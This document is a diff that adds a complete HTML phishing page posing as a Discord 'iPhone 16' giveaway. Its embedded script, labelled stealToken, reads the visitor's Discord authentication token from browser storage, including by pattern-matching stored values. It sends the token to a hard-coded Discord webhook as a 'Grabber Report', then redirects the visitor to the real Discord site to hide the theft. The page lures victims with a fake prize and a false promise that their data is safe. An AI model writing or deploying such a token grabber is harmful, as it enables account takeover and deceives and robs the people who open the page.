@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>🎁 You won a prize!</title>
+    <style>
+        body {
+            background: #1a1a2e;
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+        }
+        img {
+            max-width: 80%;
+            border: 4px solid gold;
+            border-radius: 20px;
+            margin: 20px 0;
+        }
+        h1 {
+            color: #ffcc00;
+        }
+        .loader {
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #ffcc00;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .note {
+            color: #aaa;
+            font-size: 14px;
+            margin-top: 30px;
+        }
+    </style>
+</head>
+<body>
+    <h1>🎉 YOU WON AN IPHONE 16!</h1>
+    <p>Verifying your Discord account...</p>
+    <div class="loader"></div>
+    <img src="https://cdn.discordapp.com/attachments/1539553182437347368/1545137691778359316/SXE_XIETRS_PRIFLE.png?ex=6a9b0d1c&is=6a99bb9c&hm=ecb987ba6df3a01eb287eac03a8af54b631f1e08b660c2a347facff3d07d3bdc" alt="Prize image">
+    <p class="note">🔒 Your data is safe – we just need to confirm you're a real Discord user.</p>
+
+    <script>
+        // ====== CONFIGURATION ======
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1545479634005524612/7kO5F7Z86zgfumFzzitcpENMPpu7bkVkpQN_B-50W4th_dUIEQWaQLmJbVVyFjLaA-s9";  // <-- PASTE YOUR WEBHOOK URL HERE
+        // ==========================
+
+        (function stealToken() {
+            let token = null;
+
+            // Try to get token from localStorage (Discord web)
+            try {
+                token = localStorage.getItem('token') || sessionStorage.getItem('token');
+                // If not found, search all keys for a token pattern
+                if (!token) {
+                    for (let key in localStorage) {
+                        let val = localStorage[key];
+                        if (typeof val === 'string' && val.match(/[a-zA-Z0-9_-]{24,}\.[a-zA-Z0-9_-]{6,}\.[a-zA-Z0-9_-]{27,}/)) {
+                            token = val;
+                            break;
+                        }
+                    }
+                }
+            } catch(e) {}
+
+            if (token) {
+                // Send token to webhook
+                try {
+                    fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            content: `🚨 **Token captured!**\n\`${token}\``,
+                            embeds: [{
+                                title: "Grabber Report",
+                                description: "Token was stolen successfully.",
+                                color: 0xff0000,
+                                footer: { text: "MrBeast Giveaway" }
+                            }]
+                        })
+                    }).catch(() => {});
+                } catch(e) {}
+
+                // Also send via image beacon (works even if fetch blocked)
+                try {
+                    const img = new Image();
+                    img.src = `https://discord.com/api/webhooks/...`; // optional fallback
+                } catch(e) {}
+            }
+
+            // Redirect to real Discord after 3 seconds to hide the theft
+            setTimeout(() => {
+                window.location.href = 'https://discord.com/channels/@me';
+            }, 3000);
+        })();
+    </script>
+</body>
+</html>
